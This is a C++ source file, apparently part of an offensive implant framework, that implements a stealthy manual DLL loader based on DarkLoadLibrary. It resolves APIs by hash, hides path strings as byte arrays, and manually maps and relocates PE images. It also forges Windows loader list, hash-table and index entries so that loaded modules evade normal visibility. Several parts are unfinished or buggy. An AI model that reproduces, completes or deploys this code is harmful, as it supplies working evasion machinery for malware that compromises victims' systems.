#include <core/include/modules.hpp>

using namespace Hash;
using namespace Opsec;
using namespace Utils;
using namespace Memory::Methods;

__attribute__((used, section(".rdata"))) uint8_t dot_dll[] = { 0x2a,0x00,0x2e,0x00,0x64,0x00,0x6c,0x00,0x6c,0x00,0x00 };
__attribute__((used, section(".rdata"))) uint8_t sys32[] = {
	0x43,0x00,0x3a,0x00,0x2f,0x00,0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,
	0x77,0x00,0x73,0x00,0x2f,0x00,0x53,0x00,0x79,0x00,0x73,0x00,0x74,0x00,0x65,0x00,
	0x6d,0x00,0x33,0x00,0x32,0x00,0x2f,0x00,0x00 };

namespace Modules {

    PLDR_DATA_TABLE_ENTRY FindModuleEntry(const uint32 hash) {
        const auto head = &(PEB_POINTER)->Ldr->InMemoryOrderModuleList;

        for (auto next = head->Flink; next != head; next = next->Flink) {
            const auto mod = CONTAINING_RECORD(next, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
            const auto name = mod->BaseDllName;

            // TODO: need checks to prevent overflows tho unlikely
            wchar_t buffer[MAX_PATH] = { };

            if (hash - HashStringW(WcsToLower(buffer, name.Buffer), WcsLength(name.Buffer)) == 0) {
                return mod;
            }
        }

        return nullptr;
    }

    FARPROC FindExportAddress(const void *base, const uint32 hash) {
        FARPROC address = nullptr;

        const auto nt_head = (PIMAGE_NT_HEADERS) (base + ((PIMAGE_DOS_HEADER) base)->e_lfanew);
        const auto exports = (PIMAGE_EXPORT_DIRECTORY) (base + nt_head->OptionalHeader.DataDirectory[0].VirtualAddress);

        if (nt_head->Signature != IMAGE_NT_SIGNATURE) {
            return address;
        }

		const auto functions = (uint32*) (U_PTR(base) + exports->AddressOfFunctions);
		const auto ordinals = (uint16*) (U_PTR(base) + exports->AddressOfNameOrdinals);
		const auto names = (uint32*) (U_PTR(base) + exports->AddressOfNames);
		
        for (auto index = 0; index < exports->NumberOfNames; index++) {
            const auto name = (char*) (U_PTR(base) + names[index]);

            char buffer[MAX_PATH] = { };

            if (hash - HashStringA(MbsToLower(buffer, name), MbsLength(name)) == 0) {
                address = (FARPROC) (U_PTR(base) + functions[ordinals[index]]); // NOTE: changed to index functions by ordinals[i]
                break;
            }
        }

        return address;
    }

	// TODO: string hash module_name
	UINT_PTR FindKernelModule(char *module_name) {
		HEXANE;

		void *buffer = nullptr;
		size_t buffer_size = 0;

		if (!NT_SUCCESS(ntstatus = ctx->win32.NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS) SystemModuleInformation, buffer, buffer_size, (PULONG)&buffer_size))) {
			return 0;
		}

		while (ntstatus == STATUS_INFO_LENGTH_MISMATCH) {
			if (buffer) {
				ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), &buffer, &buffer_size, MEM_RELEASE);
			}

			if (!NT_SUCCESS(ntstatus = ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), &buffer, 0, &buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) ||
				!NT_SUCCESS(ntstatus = ctx->win32.NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS) SystemModuleInformation, buffer, buffer_size, (PULONG)&buffer_size))) {
				return 0;
			}
		}

		if (!NT_SUCCESS(ntstatus)) {
			if (buffer) {
				ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), &buffer, &buffer_size, MEM_RELEASE);
			}
			return 0;
		}

		const auto modules = (PRTL_PROCESS_MODULES) buffer;
		if (!modules){
			return 0;
		}

		for (auto i = 0; i < modules->NumberOfModules; ++i) {
			const char *current_module_name = (char*) modules->Modules[i].FullPathName + modules->Modules[i].OffsetToFileName;

			if (!MbsCompare(current_module_name, module_name)) {
				const uintptr_t result = (uintptr_t) modules->Modules[i].ImageBase;

				ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), &buffer, &buffer_size, MEM_RELEASE);
				return result;
			}
		}

		ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), &buffer, &buffer_size, MEM_RELEASE);
		return 0;
	}

	// TODO: string hash function name 
	FARPROC FindKernelExport(HANDLE handle, uintptr_t base, const char *function) {
		HEXANE;

		UINT_PTR address = 0;
		SIZE_T exports_size = 0;
		PIMAGE_EXPORT_DIRECTORY export_data = nullptr;
		PIMAGE_EXPORT_DIRECTORY exports = nullptr;

		if (!base) {
			return 0;
		}

        IMAGE_NT_HEADERS nt_head = { };
		if (!ReadMemory(handle, &nt_head, (void*) base + ((PIMAGE_DOS_HEADER)base)->e_lfanew, sizeof(nt_head)) ||
			nt_head.Signature != IMAGE_NT_SIGNATURE) {
			goto defer;
		}

		exports = (PIMAGE_EXPORT_DIRECTORY) nt_head.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
		exports_size = nt_head.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

		if (!exports || !exports_size) {
			goto defer;
		}

		if (!NT_SUCCESS(ntstatus = ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), (void**)&export_data, 0, (PSIZE_T)&exports_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
			goto defer;
		}
		
		if (!ReadMemory(handle, export_data, C_PTR(base + U_PTR(exports)), exports_size)) {
			goto defer;
		}
		
		for (auto index = 0; index < export_data->NumberOfNames; index++) {
            const auto name = (char*) (base + ((uint32*) (base + exports->AddressOfNames))[index - 1]);

			if (MbsCompare(name, function) == 0) {
				const auto ord = (uint16*) (base + ((uint16*) (base + exports->AddressOfNameOrdinals))[index]);
				if (*ord <= 0x1000) {
					break;
				}

                address = (base + ((uint32*) (base + exports->AddressOfFunctions))[index]);
				if (address >= base + U_PTR(exports) && address <= base + U_PTR(exports) + exports_size) {
					address = 0; // function address is out of range, somehow (?)
				}

				break;
			}
		}

	defer:
		if (export_data) {
			ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), (void**) &export_data, &exports_size, MEM_RELEASE);
			export_data = nullptr;
		}

		return (FARPROC) address;
	} 

	UINT_PTR FindSection(const char* section_name, uintptr_t base, uint32_t *size) {

		uintptr_t sec_address = 0;
		size_t name_length = MbsLength(section_name);

		PIMAGE_NT_HEADERS nt_head = (PIMAGE_NT_HEADERS) (base + ((PIMAGE_DOS_HEADER) base)->e_lfanew);
		PIMAGE_SECTION_HEADER sec_head = IMAGE_FIRST_SECTION(nt_head);

		for (auto i = 0; i < nt_head->FileHeader.NumberOfSections; i++) {
			PIMAGE_SECTION_HEADER section = &sec_head[i];

			if (name_length == MbsLength((char*) section->Name)) {
				if (MemCompare(section_name, section->Name, name_length) == 0) {

					if (!section->VirtualAddress) {
						return 0;
					}
					if (size) {
						*size = section->Misc.VirtualSize;
					}

					sec_address = base + section->VirtualAddress;
				}
			}
		}

		return sec_address;
	}

    VOID InsertTailList(LIST_ENTRY *const head, LIST_ENTRY *const entry) {
        PLIST_ENTRY blink = head->Blink;

        entry->Flink   = head;
        entry->Blink   = blink;
        blink->Flink   = entry;
        head->Blink	= entry;
    }

    PLIST_ENTRY FindHashTable() {

        PLIST_ENTRY list = nullptr;
        PLIST_ENTRY head = nullptr;
        PLIST_ENTRY entry = nullptr;
        PLDR_DATA_TABLE_ENTRY current = nullptr;

        PPEB peb = PEB_POINTER;

        head = &peb->Ldr->InInitializationOrderModuleList;
        entry = head->Flink;

        do {
            current = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InInitializationOrderLinks);
            entry = entry->Flink;

            if (current->HashLinks.Flink == &current->HashLinks) {
                continue;
            }

            list = current->HashLinks.Flink;

            if (list->Flink == &current->HashLinks) {
                ULONG hash = LdrHashEntry(current->BaseDllName, true);

                list = (PLIST_ENTRY) ((size_t) current->HashLinks.Flink - hash * sizeof(LIST_ENTRY));
                break;
            }

            list = nullptr;
        } while (head != entry);

        return list;
    }

    BOOL AddHashTableEntry(PLDR_DATA_TABLE_ENTRY entry) {
        PPEB peb = PEB_POINTER;

        PLIST_ENTRY hash_table = FindHashTable();
        if (!hash_table) {
            return false;
        }

        INIT_LIST_ENTRY(&entry->HashLinks);

        // insert into hash table
        ULONG hash = LdrHashEntry(entry->BaseDllName, true);

        InsertTailList(&hash_table[hash], &entry->HashLinks);
        InsertTailList(&peb->Ldr->InLoadOrderModuleList, &entry->InLoadOrderLinks);
        InsertTailList(&peb->Ldr->InMemoryOrderModuleList, &entry->InMemoryOrderLinks);
        InsertTailList(&peb->Ldr->InInitializationOrderModuleList, &entry->InInitializationOrderLinks);

        return true;
    }

	// TODO: needs testing
    BOOL LocalLdrFindExportAddress(HMODULE base, const char *export_name, const uint16 ordinal, void **function) {

        PIMAGE_SECTION_HEADER section = nullptr;
        UINT8 local_buffer[MAX_PATH] = { };

        void *text_start = nullptr;
        void *text_end = nullptr;

        if (!base || (export_name && ordinal)) {
            return false;
        }

        PIMAGE_NT_HEADERS nt_head = RVA(PIMAGE_NT_HEADERS, base, ((PIMAGE_DOS_HEADER)base)->e_lfanew);
        if (nt_head->Signature != IMAGE_NT_SIGNATURE) {
            return false;
        }

        uint32 dot_text = TEXT;

        for (int sec_index = 0; sec_index < nt_head->FileHeader.NumberOfSections; sec_index++) {
            PIMAGE_SECTION_HEADER section = ITER_SECTION_HEADER(base, sec_index);

            uint32 sec_hash = HashStringA((char *) section->Name, MbsLength((char *) section->Name));
            if (MemCompare((void*) &dot_text, (void *) &sec_hash, sizeof(uint32))) {

                text_start = RVA(void*, base, section->VirtualAddress);
                text_end = RVA(void*, text_start, section->SizeOfRawData);
                break;
            }
        }

        if (!text_start || !text_end) {
            // NOTE: not sure why this would happen
            return false;
        }

        PIMAGE_DATA_DIRECTORY data_dire = &nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

        if (data_dire->Size) {
            const IMAGE_EXPORT_DIRECTORY *exports = RVA(PIMAGE_EXPORT_DIRECTORY, base, data_dire->VirtualAddress);
            const uint32 n_entries = !export_name ? exports->NumberOfFunctions : exports->NumberOfNames;

            for (int entry_index = 0; entry_index < n_entries; entry_index++) {

                uint32 _ordinal = 0;
                bool found = false;

                if (export_name) {
                    uint32 *_name_rva = RVA(uint32*, base, exports->AddressOfNames + entry_index * sizeof(uint32));
                    char *name = RVA(char*, base, *_name_rva);

                    if (MbsCompare(name, export_name)) {
                        found = true;

                        int16 *_ord_rva = RVA(int16*, base, exports->AddressOfNameOrdinals + entry_index * sizeof(uint16));
                        _ordinal = exports->Base + *_ord_rva;
                    }
                } else {
                    int16 *_ord_rva = RVA(int16*, base, exports->AddressOfNameOrdinals + entry_index * sizeof(int16));
                    _ordinal = exports->Base + *_ord_rva;

                    if (_ordinal == ordinal) {
                        found = true;
                    }
                }

                if (found) {
                    CONST UINT32 *function_rva = RVA(uint32*, base, exports->AddressOfFunctions + sizeof(uint32) * (_ordinal - exports->Base));
                    VOID *fn_pointer = RVA(void*, base, *function_rva);

                    // NOTE: this is another module...
                    if (text_start > fn_pointer || text_end < fn_pointer) {

                        size_t full_length = MbsLength((char*) fn_pointer);
                        size_t lib_length = 0;

                        for (size_t i = 0; i < full_length; i++) {
                            if (((char*) fn_pointer)[i] == '.') {
                                lib_length = i;
                                break;
                            }
                        }

                        if (lib_length != 0) {
                            char *found_name = (char *) fn_pointer + lib_length + 1;

							MemSet(local_buffer, 0, MAX_PATH);
                            MbsConcat((char*) local_buffer, (char*) fn_pointer);
                            MbsConcat((char*) local_buffer, (char*) dot_dll);
                            
                            LDR_DATA_TABLE_ENTRY *lib_entry = FindModuleEntry(HashStringA(MbsToLower((char*) local_buffer, found_name), lib_length));
                            if (!lib_entry || lib_entry->DllBase == base) {
                                return false;
                            }

                            if (!LocalLdrFindExportAddress((HMODULE) lib_entry->DllBase, found_name, 0, &fn_pointer)) {
                                return false;
                            }
                        }
                    }

                    *function = fn_pointer;
                    return true;
                }
            }
        }
        return false;
    }

    BOOL ResolveImports(const EXECUTABLE *mod) {
		HEXANE; 
        PIMAGE_IMPORT_BY_NAME import_name = nullptr;

		LDR_DATA_TABLE_ENTRY *entry    = nullptr;
        PIMAGE_THUNK_DATA first_thunk  = nullptr;
        PIMAGE_THUNK_DATA org_first    = nullptr;

        UINT8 local_buffer[MAX_PATH] = { };

		auto import_dire = (PIMAGE_DATA_DIRECTORY) &mod->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]; 
        if (import_dire->Size) {

			__debugbreak();
            auto import_desc = RVA(PIMAGE_IMPORT_DESCRIPTOR, mod->base, import_dire->VirtualAddress); // shlwapi.dll + 0x4a038
            for (; import_desc->Name; import_desc++) {

                CONST CHAR *name = RVA(char*, mod->base, import_desc->Name);
                HMODULE library  = nullptr;

				// can we find the module already loaded in memory?
                if (entry = FindModuleEntry(HashStringA(MbsToLower((char*)local_buffer, name), MbsLength(name)))) {
                    library = (HMODULE) entry->DllBase;
                }
                else {
					MemSet(local_buffer, 0, MAX_PATH);
					MbsToWcs((wchar_t*) local_buffer, name, MbsLength(name));

					// NOTE: use MbsLength for the buffer length only 
                    EXECUTABLE *new_load = ImportModule(LoadLocalFile, HashStringW((wchar_t*) local_buffer, WcsLength((wchar_t*) local_buffer)), nullptr, 0, nullptr);
                    if (!new_load || !new_load->success) {
                        return false;
                    }

					// TODO: still has dangling pointer to _executable->strings/memory. big problem. fix it now
                    library = (HMODULE) new_load->base;
                }

                first_thunk = RVA(PIMAGE_THUNK_DATA, mod->base, import_desc->FirstThunk);
                org_first = RVA(PIMAGE_THUNK_DATA, mod->base, import_desc->OriginalFirstThunk);

                for (; org_first->u1.Function; first_thunk++, org_first++) {
                    if (IMAGE_SNAP_BY_ORDINAL(org_first->u1.Ordinal)) {
                        if (!LocalLdrFindExportAddress(library, nullptr, (uint16) org_first->u1.Ordinal, (void **) &first_thunk->u1.Function)) {
                            return false;
                        }
                    } else {
                        import_name = RVA(PIMAGE_IMPORT_BY_NAME, mod->base, org_first->u1.AddressOfData);
                        if (!LocalLdrFindExportAddress(library, import_name->Name, 0, (void**) &first_thunk->u1.Function)) {
                            return false;
                        }
                    }
                }
            }
        }

		//import_dire = (PIMAGE_DATA_DIRECTORY) &module->nt_head->OptionalHeader[IMAGE_DIRECTORY_ENTRY_IMPORT];
        // handle the delayed import table

        if (import_dire->Size) {
            auto delay_desc = RVA(PIMAGE_DELAYLOAD_DESCRIPTOR, mod->base, import_dire->VirtualAddress);

            for (; delay_desc->DllNameRVA; delay_desc++) {
                HMODULE library = nullptr;

                const CHAR *lib_name = RVA(char*, mod->base, delay_desc->DllNameRVA);
				const SIZE_T lib_length = MbsLength(lib_name);
                const UINT32 name_hash = HashStringA(MbsToLower((char*) local_buffer, lib_name), lib_length);

                if (LDR_DATA_TABLE_ENTRY *entry = FindModuleEntry(name_hash)) {
                    library = (HMODULE) entry->DllBase;
                }
                else {
					MemSet(local_buffer, 0, MAX_PATH);
					MbsToWcs((wchar_t*) local_buffer, lib_name, MbsLength(lib_name));

                    EXECUTABLE *new_load = ImportModule(LoadLocalFile, HashStringW((wchar_t*) local_buffer, WcsLength((wchar_t*) local_buffer)), nullptr, 0, nullptr);
                    if (!new_load || !new_load->success) {
                        return false;
                    }

                    // TODO: memory leak here. Do something with this new module.
                    library = (HMODULE) new_load->base;
                }

                first_thunk = RVA(PIMAGE_THUNK_DATA, mod->base, delay_desc->ImportAddressTableRVA);
                org_first = RVA(PIMAGE_THUNK_DATA, mod->base, delay_desc->ImportNameTableRVA);

                for (; org_first->u1.Function; first_thunk++, org_first++) {
                    if (IMAGE_SNAP_BY_ORDINAL(org_first->u1.Ordinal)) {
                        if (!LocalLdrFindExportAddress(library, nullptr, (uint16) org_first->u1.Ordinal, (void **) &first_thunk->u1.Function)) {
                            return false;
                        }
                    } else {
                        import_name = RVA(PIMAGE_IMPORT_BY_NAME, mod->base, org_first->u1.AddressOfData);
                        if (!LocalLdrFindExportAddress(library, import_name->Name, 0, (void**) &first_thunk->u1.Function)) {
                            return false;
                        }
                    }
                }
            }
        }

        return true;
    }

    PRTL_RB_TREE FindModuleIndex() {
        PRTL_BALANCED_NODE node = nullptr;
        PRTL_RB_TREE index      = nullptr;

        PLDR_DATA_TABLE_ENTRY entry = FindModuleEntry(NTDLL);
        SIZE_T end = 0;

        node = &entry->BaseAddressIndexNode;
        do {
            node = (PRTL_BALANCED_NODE) (node->ParentValue & ~0x7);
        } while (node->ParentValue & ~0x7);


        if (!node->Red) {
            UINT32 length = 0;
            SIZE_T begin = 0;

            PIMAGE_NT_HEADERS nt_head = RVA(PIMAGE_NT_HEADERS, entry->DllBase, ((PIMAGE_DOS_HEADER) entry->DllBase)->e_lfanew);
            PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt_head);

            for (int sec_index = 0; sec_index < nt_head->FileHeader.NumberOfSections; sec_index++) {
                UINT32 sec_hash = HashStringA((char*) section->Name, MbsLength((char*) section->Name));
                UINT32 dot_data = DATA;

                if (MemCompare((void*) &dot_data, (void*) &sec_hash, sizeof(uint32)) == 0) {
                    begin = (size_t) entry->DllBase + section->VirtualAddress;
                    length = section->Misc.VirtualSize;
                    break;
                }

                ++section;
            }

            for (auto i = 0; i < length - sizeof(size_t); ++begin, ++i) {
                size_t stRet = MemCompare((void *) begin, &node, sizeof(size_t));

                if (stRet == sizeof(size_t)) {
                    end = begin;
                    break;
                }
            }

            if (end == 0) {
                return nullptr;
            }

            PRTL_RB_TREE rb_tree = (PRTL_RB_TREE) end;

            if (rb_tree && rb_tree->Root && rb_tree->Min) {
                index = rb_tree;
            }
        }

        return index;
    }


    BOOL MapModule(EXECUTABLE *mod) {
        HEXANE;

		bool success = false;

		SIZE_T region_size = 0;
		UINT_PTR base_rva  = 0;
		PIMAGE_DATA_DIRECTORY relocdir = nullptr;
		
		if (mod->nt_head->Signature != IMAGE_NT_SIGNATURE) {
			return false;
		}

        mod->base = 0; //mod->nt_head->OptionalHeader.ImageBase;
        region_size = (size_t) mod->nt_head->OptionalHeader.SizeOfImage;

        if (!NT_SUCCESS(ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), (void**) &mod->base, 0, &region_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) ||
            U_PTR(mod->base) != mod->nt_head->OptionalHeader.ImageBase) {

            mod->base = 0;
            region_size = (size_t) mod->nt_head->OptionalHeader.SizeOfImage;

			// NOTE: test non-prefered image base
            if (!NT_SUCCESS(ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), (void**) &mod->base, 0, &region_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) ||
				region_size != mod->nt_head->OptionalHeader.SizeOfImage) {
                goto defer;
            }
        }

		if (!mod->base) {
			goto defer;
		}

		// copy headers to allocated buffer
        for (auto head_index = 0; head_index < mod->nt_head->OptionalHeader.SizeOfHeaders; head_index++) {
            mod->base[head_index] = mod->buffer[head_index];
        }

		mod->section = IMAGE_FIRST_SECTION(mod->nt_head); 

		// copy section address to allocated buffer
        for (auto i = 0; i < mod->nt_head->FileHeader.NumberOfSections; i++, mod->section++) {
            for (auto sec_index = 0; sec_index < mod->section->SizeOfRawData; sec_index++) {
                (mod->base + mod->section->VirtualAddress)[sec_index] = (mod->buffer + mod->section->PointerToRawData)[sec_index];
            }
        }

        base_rva = U_PTR(mod->base) - U_PTR(mod->nt_head->OptionalHeader.ImageBase);
        relocdir = (PIMAGE_DATA_DIRECTORY) &mod->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

        // if non-zero rva and relocdir exists...
        if (base_rva && relocdir) {
            PIMAGE_BASE_RELOCATION reloc = RVA(PIMAGE_BASE_RELOCATION, mod->base, relocdir->VirtualAddress);

            do {
                PBASE_RELOCATION_ENTRY head = (PBASE_RELOCATION_ENTRY) reloc + 1;

                do {
                    switch (head->Type) {
                        case IMAGE_REL_BASED_DIR64:   *(uint32 *) (B_PTR(mod->base) + reloc->VirtualAddress + head->Offset) += base_rva; break;
                        case IMAGE_REL_BASED_HIGHLOW: *(uint32 *) (B_PTR(mod->base) + reloc->VirtualAddress + head->Offset) += (uint32) base_rva; break;
                        case IMAGE_REL_BASED_HIGH:    *(uint32 *) (B_PTR(mod->base) + reloc->VirtualAddress + head->Offset) += HIWORD(base_rva); break;
                        case IMAGE_REL_BASED_LOW:     *(uint32 *) (B_PTR(mod->base) + reloc->VirtualAddress + head->Offset) += LOWORD(base_rva); break;
                    }
                    head++;
                } while (B_PTR(head) != B_PTR(reloc) + reloc->SizeOfBlock);

                reloc = (PIMAGE_BASE_RELOCATION) head;
            } while (reloc->VirtualAddress);
        }

        mod->nt_head->OptionalHeader.ImageBase = U_PTR(mod->base); // set the prefered base to the real base
		success = true;

	defer:
		if (!success) {
			if (mod->base) {
				ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), (void**) &mod->base, &region_size, MEM_RELEASE);
			}
		}

        return success;
    }

    BOOL AddModuleEntry(PLDR_DATA_TABLE_ENTRY entry, const void *base) {
        HEXANE;

        PRTL_RB_TREE index = FindModuleIndex();
        if (!index) {
            return false;
        }

        bool right_hand = false;
        PLDR_DATA_TABLE_ENTRY node = (PLDR_DATA_TABLE_ENTRY) ((size_t) index - offsetof(LDR_DATA_TABLE_ENTRY, BaseAddressIndexNode));

        do {
            // NOTE: looking for correct in-memory order placement according to RB Tree
            if (base < node->DllBase) {
                if (!node->BaseAddressIndexNode.Left) {
                    break;
                }

                node = (PLDR_DATA_TABLE_ENTRY) ((size_t) node->BaseAddressIndexNode.Left - offsetof(LDR_DATA_TABLE_ENTRY, BaseAddressIndexNode));
            } else if (base > node->DllBase) {
                if (!node->BaseAddressIndexNode.Right) {
                    right_hand = true;
                    break;
                }

                node = (PLDR_DATA_TABLE_ENTRY) ((size_t) node->BaseAddressIndexNode.Right - offsetof(LDR_DATA_TABLE_ENTRY, BaseAddressIndexNode));
            } else {
                node->DdagNode->LoadCount++;
            }
        } while (true);

        if (!ctx->win32.RtlRbInsertNodeEx(index, &node->BaseAddressIndexNode, right_hand, &entry->BaseAddressIndexNode)) {
            return false;
        }

        return true;
    }

    BOOL GetModulePath(EXECUTABLE *mod, const uint32 name_hash) {
        HEXANE;

		WCHAR filename[MAX_PATH] = { };
		WIN32_FIND_DATAW data = { };
		HANDLE handle = { };
		BOOL success = false;

        if (!name_hash) {
            return false;
        }

        mod->local_name = (wchar_t*) Malloc(MAX_PATH);
        if (!mod->local_name) {
            goto defer;
        }

		MemCopy(B_PTR(filename), (char*)sys32, sizeof(sys32));
		WcsConcat(filename, (wchar_t*)dot_dll);

		handle = ctx->win32.FindFirstFileW(filename, &data);
		if (INVALID_HANDLE_VALUE == handle) {
			goto defer;
		}

		do {
			if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				continue;
			} else {
				if (HashStringW(data.cFileName, WcsLength(data.cFileName)) - name_hash == 0) {
					MemSet(filename, 0, MAX_PATH);
					MemCopy(filename, data.cFileName, WcsLength(data.cFileName) * sizeof(wchar_t));
				}
			}
		} while (ctx->win32.FindNextFileW(handle, &data) != 0);

		if (!filename[0]) {
			goto defer;
		}

		MemCopy(B_PTR(mod->local_name), (char*)sys32, sizeof(sys32));
		WcsConcat(mod->local_name, (wchar_t*)filename);

        mod->cracked_name = (wchar_t*) Malloc(WcsLength(filename) * sizeof(wchar_t) + 1);
		if (!mod->cracked_name) {
			goto defer;
		}

		MemCopy(mod->cracked_name, filename, WcsLength(filename) * sizeof(wchar_t) + 1);
		success = true;

	defer:
		if (!success) {
			if (mod->cracked_name) {
				Free(mod->cracked_name);
			}
			if (mod->local_name) {
				Free(mod->local_name);
			}
		}

		if (handle) {
			ctx->win32.FindClose(handle);
		}
        return success;
    }

    BOOL ReadModule(EXECUTABLE *mod) {
        HEXANE;

        HANDLE handle = ctx->win32.CreateFileW(mod->local_name, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
        if (handle == INVALID_HANDLE_VALUE) {
            return false;
        }

        SIZE_T size = ctx->win32.GetFileSize(handle, nullptr);
        if (size == INVALID_FILE_SIZE) {
            ctx->win32.NtClose(handle);
            return false;
        }

        if (!NT_SUCCESS(ntstatus = ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), (VOID**) &mod->buffer, size, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
            ctx->win32.NtClose(handle);
            return false;
        }

        if (!ctx->win32.ReadFile(handle, mod->buffer, size, (DWORD*) &mod->size, nullptr)) {
            ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), (VOID**) &mod->buffer, &size, 0);
            ctx->win32.NtClose(handle);
            return false;
        }

        ctx->win32.NtClose(handle);
        return true;
    }


    BOOL LinkModule(EXECUTABLE *mod) {
		// TODO: needs tested
        HEXANE;

		PIMAGE_NT_HEADERS nt_head = RVA(PIMAGE_NT_HEADERS, mod->buffer, ((PIMAGE_DOS_HEADER)mod->buffer)->e_lfanew);

        UNICODE_STRING full_name = { };
		UNICODE_STRING base_name = { };

        ctx->win32.RtlInitUnicodeString(&full_name, mod->local_name);
        ctx->win32.RtlInitUnicodeString(&base_name, mod->cracked_name);

        PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY) Malloc(sizeof(LDR_DATA_TABLE_ENTRY));
        if (!entry) {
            return false;
        }

        // start setting the values in the entry
        ctx->win32.NtQuerySystemTime(&entry->LoadTime);

        // do the obvious ones
        entry->ReferenceCount = 1;
        entry->LoadReason     = LoadReasonDynamicLoad;
        entry->OriginalBase   = mod->nt_head->OptionalHeader.ImageBase;

        // set the hash value
        entry->BaseNameHashValue = LdrHashEntry(entry->BaseDllName, false);

        // correctly add the base address to the entry
        AddModuleEntry(entry, (void *) mod->base);

        // and the rest
        entry->ImageDll = true;
        entry->LoadNotificationsSent = true; 
        entry->EntryProcessed = true;
        entry->InLegacyLists  = true;
        entry->InIndexes      = true;
        entry->ProcessAttachCalled = true;
        entry->InExceptionTable    = false;
        entry->DllBase     = (void*) mod->base;
        entry->SizeOfImage = mod->nt_head->OptionalHeader.SizeOfImage;
        entry->TimeDateStamp = mod->nt_head->FileHeader.TimeDateStamp;
        entry->BaseDllName = base_name;
        entry->FullDllName = full_name;
        entry->ObsoleteLoadCount = 1;
        entry->Flags = LDRP_IMAGE_DLL | LDRP_ENTRY_INSERTED | LDRP_ENTRY_PROCESSED | LDRP_PROCESS_ATTACH_CALLED;

        // set the correct values in the Ddag node struct
        entry->DdagNode = (PLDR_DDAG_NODE) Malloc(sizeof(LDR_DDAG_NODE));
        if (!entry->DdagNode) {
            return 0;
        }

        entry->NodeModuleLink.Flink = &entry->DdagNode->Modules;
        entry->NodeModuleLink.Blink = &entry->DdagNode->Modules;

        entry->DdagNode->Modules.Flink = &entry->NodeModuleLink;
        entry->DdagNode->Modules.Blink = &entry->NodeModuleLink;
        entry->DdagNode->State = LdrModulesReadyToRun;
        entry->DdagNode->LoadCount = 1;

        // add the hash to the hash_table
        AddHashTableEntry(entry);

        // set the entry point
        entry->EntryPoint = (PLDR_INIT_ROUTINE) RVA(LPVOID, mod->base, mod->nt_head->OptionalHeader.AddressOfEntryPoint);

        return true;
    }

    PEXECUTABLE ImportModule(const uint32 load_type, const uint32 name_hash, uint8 *memory, const uint32 mem_size, wchar_t *name) {
        // NOTE: code based off of https://github.com/bats3c/DarkLoadLibrary
        HEXANE;

        EXECUTABLE *mod = (EXECUTABLE*) ctx->win32.RtlAllocateHeap(ctx->heap, HEAP_ZERO_MEMORY, sizeof(EXECUTABLE));
        if (!mod) {
            return nullptr;
        }

        mod->success = false;
        mod->link = true;

		// check if this shit is already loaded instead of wasting time/resources/access violations
		LDR_DATA_TABLE_ENTRY *check_mod = nullptr;

		if (name_hash && (load_type & LoadBof) != LoadBof) { 
			if (check_mod = FindModuleEntry(name_hash)) {
                mod->base = B_PTR(check_mod->DllBase);
                mod->success = true;

				goto defer;
			}
		}

        switch (LOWORD(load_type)) {
            case LoadLocalFile: {
				// TODO: using name hashes for file search would need to hash every entry in the directory, creating performance overhead.
				// how bad would it perform? Is the stealth payoff worth it? needs testing.
				if (!GetModulePath(mod, name_hash) || !ReadModule(mod)) {
					goto defer;
				}

				break;
			}
            case LoadMemory: {
				mod->size         = mem_size;
				mod->buffer       = memory;
				mod->cracked_name = name;
				mod->local_name   = name;

				if (name == nullptr) {
					goto defer;
				}
				break;
			}

            default:
			break;
        }

        if (load_type & NoLink)
            mod->link = false;

        if (name == nullptr) {
            name = mod->cracked_name;
        }

        FindHeaders(mod);
        if (!ImageCheckArch(mod)) {
            goto defer;
        }

        // map the sections into memory
		// TODO: fix ResolveImports
        if (!MapModule(mod) || !ResolveImports(mod)) {
            goto defer;
        }

        if (mod->link) {
            if (!LinkModule(mod)) {
                goto defer;
            }
        }

        // trigger tls callbacks, set permissions and call the entry point
		/*
				if (!BeginExecution(mod)) {
					goto defer;
				}
				*/

        mod->success = true;

        defer:
        // TODO: delete the _executable* and keep the base. that's all I need tbh...
        return mod;
    }


    BOOL ConcealLibrary(EXECUTABLE pdModule, BOOL bConceal) {
        // TODO:
        return false;
    }
}

